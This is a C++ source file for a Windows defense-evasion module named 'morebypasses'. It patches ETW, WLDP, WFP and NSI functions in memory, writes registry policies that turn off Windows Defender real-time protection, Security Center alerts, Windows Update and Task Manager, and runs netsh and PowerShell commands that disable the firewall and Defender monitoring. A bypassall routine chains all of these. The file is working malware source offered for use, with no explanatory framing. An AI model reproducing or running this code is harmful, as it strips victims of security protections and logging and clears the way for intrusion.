// almost all useless

#include "extra.h"
#include <Psapi.h>
#include <Winternl.h>
#include <ntstatus.h>
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "ntdll.lib")

morebypasses::morebypasses() {}
morebypasses::~morebypasses() {}

bool morebypasses::patchwldp() {
    HMODULE wldp = LoadLibraryA("wldp.dll");
    if (!wldp) return false;
    FARPROC wldpquery = GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");
    if (!wldpquery) return false;
    DWORD oldprotect;
    VirtualProtect(wldpquery, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
#else
    uint8_t patch[] = { 0x33, 0xC0, 0xC2, 0x08, 0x00 }; // xor eax, eax; ret 8
#endif
    memcpy(wldpquery, patch, sizeof(patch));
    VirtualProtect(wldpquery, 8, oldprotect, &oldprotect);
    FARPROC wldppolicy = GetProcAddress(wldp, "WldpIsDynamicCodePolicyEnabled");
    if (wldppolicy) {
        VirtualProtect(wldppolicy, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
        memcpy(wldppolicy, patch, sizeof(patch));
        VirtualProtect(wldppolicy, 8, oldprotect, &oldprotect);
    }
    return true;
}

bool morebypasses::patchingaetw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    FARPROC etwwriteex = GetProcAddress(ntdll, "EtwEventWriteEx");
    if (!etwwriteex) return false;
    DWORD oldprotect;
    VirtualProtect(etwwriteex, 4, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
#else
    uint8_t patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret 0x14
#endif
    memcpy(etwwriteex, patch, sizeof(patch));
    VirtualProtect(etwwriteex, 4, oldprotect, &oldprotect);
    return true;
}

bool morebypasses::patchwfp() {
    HMODULE fwpuclnt = LoadLibraryA("Fwpuclnt.dll");
    if (!fwpuclnt) return false;
    FARPROC fwpmopen = GetProcAddress(fwpuclnt, "FwpmEngineOpen0");
    if (!fwpmopen) return false;
    DWORD oldprotect;
    VirtualProtect(fwpmopen, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // always return success
#else
    uint8_t patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret
#endif
    memcpy(fwpmopen, patch, sizeof(patch));
    VirtualProtect(fwpmopen, 8, oldprotect, &oldprotect);
    return true;
}

bool morebypasses::patchnsi() {
    HMODULE nsi = LoadLibraryA("NSI.dll");
    if (!nsi) return false;
    FARPROC nsiset = GetProcAddress(nsi, "NsiSetAllParameters");
    if (!nsiset) return false;
    DWORD oldprotect;
    VirtualProtect(nsiset, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90 }; // ret + nops
#else
    uint8_t patch[] = { 0xC2, 0x08, 0x00, 0x90, 0x90, 0x90 }; // ret 8 + nops
#endif
    memcpy(nsiset, patch, sizeof(patch));
    VirtualProtect(nsiset, 8, oldprotect, &oldprotect);
    return true;
}

bool morebypasses::disablewsc() {
    HKEY hkey;
    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Security Center", 0, NULL, 0,
        KEY_WRITE, NULL, &hkey, NULL);
    if (result == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExA(hkey, "AntiVirusDisableNotify", 0, REG_DWORD,
            (BYTE*)&value, sizeof(value));
        RegSetValueExA(hkey, "FirewallDisableNotify", 0, REG_DWORD,
            (BYTE*)&value, sizeof(value));
        RegSetValueExA(hkey, "UpdatesDisableNotify", 0, REG_DWORD,
            (BYTE*)&value, sizeof(value));
        RegCloseKey(hkey);
        return true;
    }
    return false;
}

bool morebypasses::disablewu() {
    HKEY hkey;
    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU",
        0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL);
    if (result == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hkey, "NoAutoUpdate", 0, REG_DWORD,
            (BYTE*)&value, sizeof(value));
        RegCloseKey(hkey);
        return true;
    }
    return false;
}

bool morebypasses::disablewdf() {
    std::string cmd = "netsh advfirewall set allprofiles state off";
    system(cmd.c_str());
    return true;
}

bool morebypasses::disabletaskmgr() {
    HKEY hkey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL);
    if (result == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hkey, "DisableTaskMgr", 0, REG_DWORD,
            (BYTE*)&value, sizeof(value));
        RegCloseKey(hkey);
        return true;
    }
    return false;
}

bool morebypasses::disabledefender() {
    HKEY hkey;
    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL);
    if (result == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hkey, "DisableAntiSpyware", 0, REG_DWORD,
            (BYTE*)&value, sizeof(value));
        HKEY rtphkey;
        RegCreateKeyExA(hkey, "Real-Time Protection", 0, NULL, 0,
            KEY_WRITE, NULL, &rtphkey, NULL);
        if (rtphkey) {
            RegSetValueExA(rtphkey, "DisableRealtimeMonitoring", 0, REG_DWORD,
                (BYTE*)&value, sizeof(value));
            RegSetValueExA(rtphkey, "DisableBehaviorMonitoring", 0, REG_DWORD,
                (BYTE*)&value, sizeof(value));
            RegSetValueExA(rtphkey, "DisableOnAccessProtection", 0, REG_DWORD,
                (BYTE*)&value, sizeof(value));
            RegSetValueExA(rtphkey, "DisableScanOnRealtimeEnable", 0, REG_DWORD,
                (BYTE*)&value, sizeof(value));
            RegSetValueExA(rtphkey, "DisableIOAVProtection", 0, REG_DWORD,
                (BYTE*)&value, sizeof(value));
            RegCloseKey(rtphkey);
        }

        RegCloseKey(hkey);
        return true;
    }
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"");
    return true;
}

bool morebypasses::bypassall() {
    bool anySuccess = false;

    if (patchwldp()) anySuccess = true;
    if (patchingaetw()) anySuccess = true;
    if (patchwfp()) anySuccess = true;
    if (patchnsi()) anySuccess = true;
    if (disablewsc()) anySuccess = true;
    if (disablewu()) anySuccess = true;
    if (disablewdf()) anySuccess = true;
    if (disabledefender()) anySuccess = true;

    return anySuccess;
}

bool morebypasses::bypassspecific(const std::string& bypassname) {
    if (bypassname == "wldp") return patchwldp();
    if (bypassname == "aetw") return patchingaetw();
    if (bypassname == "wfp") return patchwfp();
    if (bypassname == "nsi") return patchnsi();
    if (bypassname == "wsc") return disablewsc();
    if (bypassname == "wu") return disablewu();
    if (bypassname == "wdf") return disablewdf();
    if (bypassname == "defender") return disabledefender();
    if (bypassname == "taskmgr") return disabletaskmgr();

    return false;
}

std::vector<std::string> morebypasses::getavailablebypasses() {
    return {
        "wldp",
        "aetw",
        "wfp",
        "nsi",
        "wsc",
        "wu",
        "wdf",
        "defender",
        "taskmgr"
    };
}